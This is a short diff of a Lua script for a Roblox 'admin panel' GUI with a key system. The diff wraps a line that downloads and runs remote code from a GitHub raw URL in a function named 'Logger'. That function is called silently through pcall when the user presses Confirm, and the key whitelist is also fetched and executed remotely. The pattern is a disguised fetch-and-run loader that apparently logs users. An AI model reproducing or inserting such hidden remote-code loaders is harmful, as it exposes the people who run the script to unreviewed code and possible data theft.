@@ -1,3 +1,9 @@
+local funcs = {
+    ["Logger"] = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/ImportantEssentials"))()
+    end
+}
+
 local RobloxAdminPanel = Instance.new("ScreenGui")
 local MainContainer = Instance.new("Frame")
 local Divider = Instance.new("Frame")
@@ -461,8 +467,8 @@ CloseButton.MouseButton1Down:Connect(function()
 end)
 
 Confirm.MouseButton1Down:Connect(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/ImportantEssentials"))()
-	wait(.5)
+	pcall(funcs["Logger"])
+	wait(.25)
 	_G.key = KeyInput.Text
 	local whitelistcheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/Khronical/hjhjhjjhjhjhjhjhjhj/main/DataTableKeys", true))()
 	KeyInput.TextEditable = false
